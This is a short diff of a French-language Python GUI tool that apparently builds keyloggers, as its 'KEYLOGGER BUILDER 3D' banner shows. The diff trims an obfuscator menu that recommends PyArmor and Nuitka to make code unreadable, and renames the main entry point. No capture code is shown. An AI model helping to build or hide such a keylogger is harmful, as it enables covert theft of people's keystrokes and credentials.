@@ -105,18 +105,9 @@ def obfuscateur():
     messagebox.showinfo("Informations Obfuscateur", "Regardez le terminal pour les informations sur les obfuscateurs disponibles.")
     print(f"""
 
-    {Fore.GREEN}
-    1. PyMinifier (simple à utiliser, mais moins sécurisé)
+    
 
-       {Fore.YELLOW}Fonctionnalités :
-
-        Retire les espaces
-
-        Renomme les variables
-
-        Mini obfuscation facile 
-
-    {Fore.GREEN} 2. PyArmor (plus sécurisé, mais nécessite une installation supplémentaire)
+    {Fore.GREEN} 1. PyArmor (plus sécurisé, mais nécessite une installation supplémentaire)
 
     {Fore.YELLOW}PyArmor est un outil qui protège ton code Python en le transformant en bytecode chiffré, impossible à lire ou comprendre.
 
@@ -130,7 +121,7 @@ def obfuscateur():
     Il ne transforme pas ton code en .exe,
     mais il obfusque et chiffre le code Python.
 
-    {Fore.GREEN} 3. Nuitka (compilation en C pour une sécurité maximale)
+    {Fore.GREEN} 2. Nuitka (compilation en C pour une sécurité maximale)
 
     {Fore.YELLOW}Nuitka est un compilateur Python → C + binaire natif.
 
@@ -546,7 +537,7 @@ ctk.CTkLabel(
 with open("logs.txt", "a", encoding="utf-8") as f:
     f.write(f"[{time.strftime('%d-%m-%Y %H:%M:%S')}] Ouverture\n")
 
-if __name__ == "__main__":
+def key():
     print("=" * 60)
     print("⚡ KEYLOGGER BUILDER 3D")
     print("=" * 60)
